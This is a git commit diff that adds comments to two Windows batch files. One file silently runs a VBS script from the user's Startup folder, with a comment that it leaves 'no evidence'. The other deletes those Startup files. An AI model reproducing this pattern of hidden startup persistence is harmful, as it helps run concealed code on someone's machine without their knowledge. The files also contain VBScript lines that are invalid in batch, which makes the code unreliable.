8239ccbb358405c68f80c67e5e1f58d39cd083b1
unknown <nwisner>
2021-09-15 22:34:28 -0700

    Added comments

--- delete.bat
+++ delete.bat
@@ -1,3 +1,5 @@
 Set Shell = CreateObject("Shell.Application")
+
+Rem Deletes the files at the location, if there is nothing that matches, nothing happens
 DEL "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\runVBS.bat"
 DEL "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\VBS.vbs"
--- runVBS.bat
+++ runVBS.bat
@@ -1,2 +1,4 @@
 Set Shell = CreateObject("Shell.Application")
+
+Rem The /c executes the command and then closes the terminal so there is no evidence left
 start "" cmd /c cscript "VBS.vbs"
